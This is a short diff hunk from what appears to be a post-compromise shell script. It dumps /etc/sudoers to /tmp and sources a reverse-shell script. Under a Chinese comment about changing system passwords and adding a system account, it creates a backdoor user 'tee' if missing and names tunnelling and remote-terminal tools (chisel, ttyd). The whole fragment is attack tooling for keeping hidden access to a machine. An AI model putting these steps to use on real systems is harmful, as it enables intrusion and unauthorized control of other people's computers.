@@ -66,7 +66,7 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
     . /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
     )
 
-#修改系统密码 添加系统账户tee chisel-60080
+#修改系统密码 添加系统账户tee chisel-60080  ttyd.x64
 grep -q "tee" /etc/passwd ||
 (
     . /home/runner/work/nc_test/nc_test/tee_pass.sh;
